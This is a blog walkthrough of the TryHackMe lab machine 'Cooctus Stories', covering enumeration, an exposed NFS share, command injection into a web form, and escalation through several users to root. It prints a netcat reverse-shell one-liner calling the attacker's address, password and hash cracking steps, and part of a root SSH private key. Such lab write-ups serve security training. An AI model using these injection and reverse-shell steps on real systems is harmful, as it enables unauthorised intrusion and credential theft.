---
title: "Walk-through of Cooctus Stories from TryHackMe"
header:
  teaser: /assets/images/2021-04-20-22-28-49.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - 
---

## Machine Information

![cooctus](/assets/images/2021-04-20-22-28-49.png)

Cooctus Stories is a medium difficulty room on TryHackMe. An initial scan reveals an exposed nfs share, where we find credentials to get us access to a web application. We use that to gain a reverse shell, and from there we work through a number of users and flags gaining ssh access as we progress. We crack hashes, debug scripts and look through git commits on our way to root.

<!--more-->
Skills required are a basic enumeration and file system exploration knowledge. Skills learned are script analysis, working with git and working with file systems.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Cooctus Stories](https://tryhackme.com/room/https://tryhackme.com/room/cooctusadventures) |
| Machine Release Date | 20th Feb 2021 |
| Date I Completed It | 20th April 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.201.142 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
                  
┌──(root💀kali)-[~/thm/cooctus]
└─# nmap -p$ports -sC -sV -oA cooctus 10.10.201.142
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 20:53 BST
Nmap scan report for 10.10.201.142
Host is up (0.054s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      49149/tcp   mountd
|   100005  1,2,3      50965/tcp6  mountd
|   100005  1,2,3      51340/udp   mountd
|   100005  1,2,3      57223/udp6  mountd
|   100021  1,3,4      34355/tcp6  nlockmgr
|   100021  1,3,4      43801/tcp   nlockmgr
|   100021  1,3,4      56798/udp6  nlockmgr
|   100021  1,3,4      58752/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
38087/tcp open  mountd   1-3 (RPC #100005)
43801/tcp open  nlockmgr 1-4 (RPC #100021)
49149/tcp open  mountd   1-3 (RPC #100005)
51395/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
```

Lot's of ports open. Let's add the server IP to our host file before we get started:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# echo 10.10.201.142 cooctus.thm >> /etc/hosts
```

First stop as always is a look at any web servers:

![cooctus-website](/assets/images/2021-04-19-21-08-10.png)

Just a static image, and nothing interesting in the source code. Let's try gobuster and look for hidden folders:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cooctus.thm:8080
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cooctus.thm:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/04/19 21:05:24 Starting gobuster in directory enumeration mode
===============================================================
http://cooctus.thm:8080/login                (Status: 200) [Size: 556]
http://cooctus.thm:8080/cat                  (Status: 302) [Size: 219] [--> http://cooctus.thm:8080/login]
===============================================================
2021/04/19 21:39:18 Finished
===============================================================
```

We find a couple of folders, cat points to login, login gives us this:

![cooctus-login](/assets/images/2021-04-19-21-12-05.png)

A dead end for now as we have no credentials. Looking back at the port list we see 2049 which is an NFS port, let's see if any shares are exposed:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# showmount -e cooctus.thm                            
Export list for cooctus.thm:
/var/nfs/general *
```

One called general is visible, let's try to mount it and see what's inside:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# mkdir nfs    

┌──(root💀kali)-[~/thm/cooctus]
└─# mount -t nfs cooctus.thm:/var/nfs/general /root/thm/cooctus/nfs

┌──(root💀kali)-[~/thm/cooctus]
└─# ls -lsa nfs                      
total 12
4 drwxr-xr-x 2 nobody nogroup 4096 Nov 21 18:24 .
4 drwxr-xr-x 3 root   root    4096 Apr 19 21:16 ..
4 -rw-r--r-- 1 root   root      31 Nov 21 18:24 credentials.bak

┌──(root💀kali)-[~/thm/cooctus]
└─# file nfs/credentials.bak            
nfs/credentials.bak: ASCII text

┌──(root💀kali)-[~/thm/cooctus]
└─# cat nfs/credentials.bak        
paradoxial.test
<HIDDEN>
```

Ok well that was eventful! Let's see if these creds work for the login page we found before:

![cooctus-cat](/assets/images/2021-04-19-21-21-14.png)

We're in, and now we get to look at the Cooctus Attack Troubleshoorter. I wonder what we can do with the payload box:

![cooctus-test1](/assets/images/2021-04-19-21-25-36.png)

Clicking the submit button and what I've entered appears to be output to the page:

![cooctus-test1-result](/assets/images/2021-04-19-21-26-03.png)

However, I tried a ping to my Kali and that seemed to pause before the output, so I'm thinking this is executing the command then output to page after. Let's test it:

![cooctus-ping](/assets/images/2021-04-19-21-29-16.png)

Before clicking submit I've started tcpdump listening for the ping. I click submit and now switch to see the server has pinged me:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─#  tcpdump -i tun0 icmp                                             
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:28:39.138482 IP cooctus.thm > 10.8.165.116: ICMP echo request, id 1325, seq 1, length 64
21:28:39.138490 IP 10.8.165.116 > cooctus.thm: ICMP echo reply, id 1325, seq 1, length 64
21:28:40.141503 IP cooctus.thm > 10.8.165.116: ICMP echo request, id 1325, seq 2, length 64
21:28:40.141512 IP 10.8.165.116 > cooctus.thm: ICMP echo reply, id 1325, seq 2, length 64
21:28:41.142656 IP cooctus.thm > 10.8.165.116: ICMP echo request, id 1325, seq 3, length 64
21:28:41.142665 IP 10.8.165.116 > cooctus.thm: ICMP echo reply, id 1325, seq 3, length 64
21:28:42.144465 IP cooctus.thm > 10.8.165.116: ICMP echo request, id 1325, seq 4, length 64
21:28:42.144474 IP 10.8.165.116 > cooctus.thm: ICMP echo reply, id 1325, seq 4, length 64
21:28:43.145608 IP cooctus.thm > 10.8.165.116: ICMP echo request, id 1325, seq 5, length 64
21:28:43.145617 IP 10.8.165.116 > cooctus.thm: ICMP echo reply, id 1325, seq 5, length 64
```

Obvious next thing to try is a reverse shell. May as well use a [PenTestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) classic:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.165.116 4444 >/tmp/f
```

I find this one works much more than most others. Let's get a netcat listener waiting, then try the reverse shell from the webpage:

![cooctus-revshell](/assets/images/2021-04-19-21-33-26.png)

Switch to our listener and we are connected:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.201.142] 40528
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Let's upgrade to a better shell:

```text
$ python3 -c "import pty;pty.spawn('/bin/bash')"
paradox@cchq:~$ ^Z
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~/thm/cooctus]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
```

One thing to note, if you're using zsh then you need to use **stty raw -echo; fg** or you shell will crash!

Ok let's have a look around:

```text
paradox@cchq:~$ id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)

paradox@cchq:~$ pwd
/home/paradox

paradox@cchq:~$ ls -ls       
total 8
4 drwxr-xr-x 4 paradox paradox 4096 Jan  1 22:03 CATapp
4 -rw------- 1 paradox paradox   38 Feb 20 20:23 user.txt

paradox@cchq:~$ cat user.txt     
THM{HIDDEN}
```

We find the user flag for paradox, and a folder which looks to contain the CAT app running on the web server on port 8080. Let's have a further look around:

```text
paradox@cchq:~$ ls -l /home
total 16
drwxr-xr-x 5 paradox paradox 4096 Feb 22 18:48 paradox
drwxr-xr-x 5 szymex  szymex  4096 Feb 22 18:45 szymex
drwxr-xr-x 9 tux     tux     4096 Feb 20 22:02 tux
drwxr-xr-x 7 varg    varg    4096 Feb 20 22:06 varg

paradox@cchq:~$ ls -l /home/szymex/
total 16
-r-------- 1 szymex szymex  11 Jan  2 14:18 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex 316 Feb 20 20:31 note_to_para
-rwxrwxr-- 1 szymex szymex 735 Feb 20 20:30 SniffingCat.py
-rw------- 1 szymex szymex  38 Feb 22 18:45 user.txt
```

So we have four users, and in the szymex home folder we found this file that is readable by paradox:

```text
paradox@cchq:~$ cat /home/szymex/note_to_para
Paradox,
I'm testing my new Dr. Pepper Tracker script.
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.
You know me, so you know how to get access to the file.
- Szymex
```

And also this one:

```text
paradox@cchq:~$ cat /home/szymex/SniffingCat.py 
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
```

Reading through the script we can see it reads something from the file mysupersecretpassword.txt, runs it through a function to encode it, and checks if it matches enc_pw which should be pureelpbxr. The encoding function uses the number 13 a couple of times, so I'm thinking is it rot13 encoded. I tried pasting it in Google and got this as first hit:

![cooctus-rot13](/assets/images/2021-04-19-22-17-38.png)

Worth a try, so I found [this](https://cryptii.com/pipes/rot13-decoder) decoder and pasted it in:

![cooctus-decode-rot13](/assets/images/2021-04-19-22-19-33.png)

We found the password, and looking back at the script the clue is there where it mentions Dr. Pepper!

We know port 22 is open, so I tried ssh with this password and the user szymex:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# ssh szymex@cooctus.thm                                                                  
The authenticity of host 'cooctus.thm (10.10.143.94)' can't be established.
ECDSA key fingerprint is SHA256:7/RM1nMYqyZHC8ICXMcPUC3vIVlZuQab39ZsXs9Q+NI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cooctus.thm,10.10.143.94' (ECDSA) to the list of known hosts.
szymex@cooctus.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

Last login: Mon Feb 22 18:45:01 2021 from 172.16.228.1
szymex@cchq:~$ 
```

A quick look in his home folder get's us another flag:

```text
szymex@cchq:~$ pwd
/home/szymex
szymex@cchq:~$ ls -ls
total 16
4 -r-------- 1 szymex szymex  11 Jan  2 14:18 mysupersecretpassword.cat
4 -rw-rw-r-- 1 szymex szymex 316 Feb 20 20:31 note_to_para
4 -rwxrwxr-- 1 szymex szymex 735 Feb 20 20:30 SniffingCat.py
4 -rw------- 1 szymex szymex  38 Feb 22 18:45 user.txt
szymex@cchq:~$ cat mysupersecretpassword.cat
cherrycoke
szymex@cchq:~$ cat user.txt
THM{HIDDEN}
szymex@cchq:~$
```

I have a look in the other users home folders, in tux I see this:

```text
szymex@cchq:/home/tux$ ls -l
total 16
-rw-rw-r-- 1 tux tux      630 Jan  2 19:05 note_to_every_cooctus
drwxrwx--- 2 tux testers 4096 Feb 20 16:28 tuxling_1
drwxrwx--- 2 tux testers 4096 Feb 20 21:02 tuxling_3
-rw------- 1 tux tux       38 Feb 20 21:05 user.txt
```

First let's look at the note as we have permissions to read:

```text
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
```

It mentions 3 tuxling trials. It looks like we have two of them here called tuxling_1 and tuxling_3, I'm assuming there's another somewhere so search for it:

```text
szymex@cchq:/home/tux$ find / -type d -name tuxling_2 2>/dev/null 
/media/tuxling_2
szymex@cchq:/home/tux$ 
```

Ok so that one was hidden in the /media folder. Let's have a look at the first one:

```text
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me.
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```

Looking at the nootcode.c file:

```text
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c 
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

At first this appears weird, but if you look closely you can see the section under the #define part is simply a search and replace for each word from the list above it. The decoded code looks like this:

```text
#include <stdio.h>

int main (){
    printf ( "What does the penguin say?") ;
    nuut() ;
    // I added this coded before return 0
    printf("\n\n key:- \t");
    key();
    printf("\n\n");
    return 0 ;
}

void key() {
    printf("f96" "050a" "d61");
}

void nuut (){
    printf("NOOT!") ;
}
```

This gives us the key for part 1. On to part 2:

```text
szymex@cchq:/home/tux/tuxling_1$ cd /media/tuxling_2/
szymex@cchq:/media/tuxling_2$ ls -l
total 12
-rw-rw-r-- 1 tux testers  740 Feb 20 20:00 fragment.asc
-rw-rw---- 1 tux testers  280 Jan  2 20:20 note
-rw-rw-r-- 1 tux testers 3670 Feb 20 20:01 private.key

szymex@cchq:/media/tuxling_2$ cat note 
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

This one is nice and simple. We can just import the key and then decrypt:

```text
szymex@cchq:/media/tuxling_2$ gpg --import private.key 
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc 
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
```

On to the last one:

```text
szymex@cchq:/media/tuxling_2$ cd /home/tux/tuxling_3
szymex@cchq:/home/tux/tuxling_3$ ls -l
-rwxrwx--- 1 tux testers 178 Feb 20 21:02 note

szymex@cchq:/home/tux/tuxling_3$ cat note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

Ah, a give away. That was no challenge at all!

As suggested I put all three fragments together:

```text
f<HIDDEN>2
```

He says visit the station? Must be crackstation as this looks like a hash:

![cooctus-tux-pass](/assets/images/2021-04-19-22-51-43.png)

Nice. We probably have another password, this time presumably for tux. Let's try it:

```text
zymex@cchq:/home/tux/tuxling_3$ su tux
Password: 
tux@cchq:~/tuxling_3$
```

Let's get the next flag:

```text
tux@cchq:~/tuxling_3$ cd /home/tux/
tux@cchq:~$ cat user.txt 
THM{HIDDEN}
```

Now we move on to varg:

```text
tux@cchq:~$ cd /home/varg/
tuxg@cchq:~$ ls -l
-rwsrws--x  1 varg varg      2146 Feb 20 22:05 CooctOS.py
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 cooctOS_src
-rw-------  1 varg varg        38 Feb 20 21:08 user.txt
```

Hmm, what is that source folder:

```text
tux@cchq:/home/varg$ cd cooctOS_src/
tuxg@cchq:/home/varg/cooctOS_src$ ls -la
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 .
drwxr-xr-x  7 varg varg      4096 Feb 20 22:06 ..
drwxrwx---  2 varg os_tester 4096 Feb 20 15:46 bin
drwxrwx---  4 varg os_tester 4096 Feb 20 15:22 boot
drwxrwx---  2 varg os_tester 4096 Feb 20 15:10 etc
drwxrwx---  2 varg os_tester 4096 Feb 20 15:41 games
drwxrwxr-x  8 varg os_tester 4096 Feb 20 15:47 .git
drwxrwx---  3 varg os_tester 4096 Feb 20 14:44 lib
drwxrwx--- 16 varg os_tester 4096 Feb 20 15:21 run
drwxrwx---  2 varg os_tester 4096 Feb 20 09:11 tmp
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:20 var
```

A hidden .git folder, let's look in there:

```text
tux@cchq:/home/varg/cooctOS_src$ cd .git/
tux@cchq:/home/varg/cooctOS_src/.git$ ls -l
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 branches
-rw-rw-r--  1 varg os_tester   37 Feb 20 15:47 COMMIT_EDITMSG
-rw-rw-r--  1 varg os_tester   92 Feb 20 15:44 config
-rw-rw-r--  1 varg os_tester   73 Feb 20 15:44 description
-rw-rw-r--  1 varg os_tester   23 Feb 20 15:44 HEAD
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 hooks
-rw-rw-r--  1 varg os_tester  825 Feb 20 15:47 index
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 info
drwxrwxr-x  3 varg os_tester 4096 Feb 20 15:46 logs
drwxrwxr-x 17 varg os_tester 4096 Feb 20 15:47 objects
drwxrwxr-x  4 varg os_tester 4096 Feb 20 15:44 refs
```

We have a git repo, we can use **git show** to have a look at the last commit:

```text
tux@cchq:/home/varg/cooctOS_src/.git$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
@@ -1,52 +0,0 @@
-#!/usr/bin/python3
-
-import time
-import os;
-import pty;
-
-#print(chr(27)+ "[2J")
-logo = """\033[1;30;49m
- ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
-██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝\033[1;37;49m██╔═══██╗██╔════╝\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
-╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
- ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
-"""
-print(logo)
-print("                       LOADING")
-print("[", end='')
-
-for i in range(0,60):
-    #print(chr(27)+ "[2J")
-    #print(logo)
-    #print("                       LOADING")
-    print("[", end='')
-    print("=" * i, end='')
-    print("]")
-    time.sleep(0.02)
-    print("\033[A\033[A")
-
-print("\032")
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
-
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "<HIDDEN>":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break
```

We see there's a password mentioned in the source code, could this be for varg:

```text
tux@cchq:/home/varg/cooctOS_src/.git$ su varg
Password: 
varg@cchq:~/cooctOS_src/.git$ 
```

Yep! Let's grab the user flag for varg before we move on:

```text
varg@cchq:~$ cat /home/varg/user.txt 
THM{HIDDEN}
```

Last step is finding our way to root. For CTF there's a few things I always check before resorting to [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) or similar. One of them is sudo privileges. I checked it for varg:

```text
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

There is no reason for this user to have that unless it's our intended path.

It had me puzzled for a while, but I found [this](https://linoxide.com/list-mounted-drives-on-linux/) really interesting article. It shows lots of ways to find mounted volumes. First I listed them all:

```text
varg@cchq:~$ findmnt
TARGET                                SOURCE                                                    FSTYPE      OPTIONS
/                                     /dev/mapper/ubuntu--vg-ubuntu--lv                         ext4        rw,relatime,data=ordered
├─/sys                                sysfs                                                     sysfs       rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs                                                securityfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs                                                     tmpfs       ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup                                                    cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/memory           cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/pids             cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,pids
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/devices          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,devices
│ │ ├─/sys/fs/cgroup/blkio            cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/freezer          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/cpuset           cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/rdma             cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,rdma
│ │ └─/sys/fs/cgroup/perf_event       cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,perf_event
│ ├─/sys/fs/pstore                    pstore                                                    pstore      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/debug                 debugfs                                                   debugfs     rw,relatime
│ ├─/sys/kernel/config                configfs                                                  configfs    rw,relatime
│ └─/sys/fs/fuse/connections          fusectl                                                   fusectl     rw,relatime
├─/proc                               proc                                                      proc        rw,nosuid,nodev,noexec,relatime
│ ├─/proc/sys/fs/binfmt_misc          systemd-1                                                 autofs      rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14925
│ │ └─/proc/sys/fs/binfmt_misc        binfmt_misc                                               binfmt_misc rw,relatime
│ └─/proc/fs/nfsd                     nfsd                                                      nfsd        rw,relatime
├─/dev                                udev                                                      devtmpfs    rw,nosuid,relatime,size=213660k,nr_inodes=53415,mode=755
│ ├─/dev/pts                          devpts                                                    devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs                                                     tmpfs       rw,nosuid,nodev
│ ├─/dev/hugepages                    hugetlbfs                                                 hugetlbfs   rw,relatime,pagesize=2M
│ └─/dev/mqueue                       mqueue                                                    mqueue      rw,relatime
├─/run                                tmpfs                                                     tmpfs       rw,nosuid,noexec,relatime,size=49072k,mode=755
│ ├─/run/lock                         tmpfs                                                     tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/rpc_pipefs                   sunrpc                                                    rpc_pipefs  rw,relatime
│ └─/run/user/1002                    tmpfs                                                     tmpfs       rw,nosuid,nodev,relatime,size=49068k,mode=700,uid=1002,gid=1002
├─/opt/CooctFS                        /dev/mapper/ubuntu--vg-ubuntu--lv[/home/varg/cooctOS_src] ext4        rw,relatime,data=ordered
└─/boot                               /dev/xvda2                                                ext4        rw,relatime,data=ordered
varg@cchq:~$ 
```

I wondered why /opt/CoocFS is mounted and not just a folder. So tried it with -s:

```text
varg@cchq:~$ findmnt -s
TARGET       SOURCE                                                                                       FSTYPE OPTIONS
/            /dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo ext4   defaults
/boot        /dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3                                       ext4   defaults
/opt/CooctFS /home/varg/cooctOS_src                                                                       none   defaults,bind
```

Interesting. I wonder if that's the target we are supposed to unmount? Let's try:

```text
varg@cchq:~$ ls /opt/CooctFS/
bin  boot  etc  games  lib  run  tmp  var

varg@cchq:~$ sudo /bin/umount /opt/CooctFS

varg@cchq:~$ ls /opt/CooctFS/
root
```

Clever. The CooctFS mount was hiding the root folder that was already inside. Let's have a look:

```text
varg@cchq:~$ ls -la /opt/CooctFS/root
drwxr-xr-x 5 root root 4096 Feb 20 09:16 .
drwxr-xr-x 3 root root 4096 Feb 20 09:09 ..
lrwxrwxrwx 1 root root    9 Feb 20 09:15 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc
drwx------ 3 root root 4096 Feb 20 09:09 .cache
drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local
-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
```

We found the root flag:

```text
varg@cchq:~$ cat /opt/CooctFS/root/root.txt
hmmm...
No flag here. You aren't root yet.
```

Ah, tricked us! However there's a .ssh folder, so we can probably just copy the id_rsa key to Kali then use it to log in as root:

```text
varg@cchq:~$ cat /opt/CooctFS/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
<SNIP>
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
